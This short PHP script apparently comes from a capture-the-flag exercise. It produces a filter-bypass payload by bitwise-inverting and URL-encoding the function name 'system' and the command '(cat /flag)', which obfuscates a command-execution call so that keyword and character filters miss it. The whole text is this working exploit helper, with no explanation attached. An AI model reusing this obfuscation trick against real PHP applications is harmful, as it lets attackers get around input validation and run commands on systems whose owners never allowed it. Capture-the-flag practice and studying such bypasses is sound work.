<?php
$a = "system";
$b = '(cat /flag)';
echo (urlencode(~$a));
echo "\n";
echo (urlencode(~$b));